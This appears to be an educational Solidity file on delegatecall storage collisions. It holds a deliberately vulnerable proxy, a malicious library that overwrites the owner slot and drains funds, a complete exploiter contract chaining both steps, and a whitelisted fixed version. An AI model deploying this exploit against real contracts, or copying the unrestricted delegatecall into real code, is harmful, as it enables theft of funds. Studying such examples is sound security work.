// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/// @title DelegateCallVuln - Vulnerable to delegatecall attacks
/// @notice Demonstrates storage collision and arbitrary code execution
/// @dev DO NOT USE IN PRODUCTION

contract VulnerableProxy {
    address public owner;           // slot 0
    address public implementation;  // slot 1
    uint256 public value;          // slot 2

    event ImplementationUpdated(address indexed newImplementation);
    event Executed(address indexed target, bytes data, bytes result);

    constructor(address _implementation) {
        owner = msg.sender;
        implementation = _implementation;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    /// @notice VULNERABLE: Unrestricted delegatecall
    /// @dev Allows arbitrary code execution in proxy context
    function execute(address target, bytes calldata data)
        external
        payable
        returns (bytes memory)
    {
        // VULNERABILITY: No validation of target address
        (bool success, bytes memory result) = target.delegatecall(data);
        require(success, "Delegatecall failed");

        emit Executed(target, data, result);
        return result;
    }

    /// @notice Update implementation
    function updateImplementation(address newImpl) external onlyOwner {
        implementation = newImpl;
        emit ImplementationUpdated(newImpl);
    }
}

/// @title MaliciousLibrary - Exploits storage layout
contract MaliciousLibrary {
    address public owner;           // slot 0 - overwrites proxy owner!
    address public implementation;  // slot 1
    uint256 public value;          // slot 2

    /// @notice Changes ownership by writing to slot 0
    function takeOwnership() external {
        owner = msg.sender;  // Overwrites proxy's owner storage slot!
    }

    /// @notice Drains contract balance
    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

/// @title ProxyExploiter - Complete attack
contract ProxyExploiter {
    VulnerableProxy public target;
    MaliciousLibrary public malicious;

    constructor(address _target) {
        target = VulnerableProxy(payable(_target));
        malicious = new MaliciousLibrary();
    }

    /// @notice Execute full exploit
    function exploit() external {
        // Step 1: Call malicious library via delegatecall
        // This overwrites owner in proxy's storage
        bytes memory data = abi.encodeWithSignature("takeOwnership()");
        target.execute(address(malicious), data);

        // Step 2: Verify ownership changed
        require(target.owner() == address(this), "Exploit failed");

        // Step 3: Drain funds
        data = abi.encodeWithSignature("drain()");
        target.execute(address(malicious), data);
    }

    receive() external payable {}
}

/// @title SecureProxy - Fixed version with whitelist
contract SecureProxy {
    address public owner;
    address public implementation;
    mapping(address => bool) public allowedTargets;

    constructor(address _implementation) {
        owner = msg.sender;
        implementation = _implementation;
        allowedTargets[_implementation] = true;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    /// @notice SECURE: Validates target before delegatecall
    function execute(address target, bytes calldata data)
        external
        payable
        onlyOwner
        returns (bytes memory)
    {
        require(allowedTargets[target], "Target not allowed");
        (bool success, bytes memory result) = target.delegatecall(data);
        require(success, "Delegatecall failed");
        return result;
    }

    function addAllowedTarget(address target) external onlyOwner {
        allowedTargets[target] = true;
    }
}
